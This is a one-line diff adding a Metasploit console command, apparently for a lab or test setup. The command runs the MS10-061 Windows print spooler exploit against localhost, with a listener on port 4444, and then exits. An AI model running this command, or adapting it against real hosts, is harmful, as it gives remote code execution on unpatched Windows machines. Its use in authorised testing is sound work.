@@ -1,0 +1,1 @@
+msfconsole -n -q -x "use exploit/windows/smb/ms10_061_spoolss; set PNAME XPSPrinter; set EXITFUNC process; set RHOST 127.0.0.1; set LHOST 127.0.0.1; set LPORT 4444; exploit; exit"
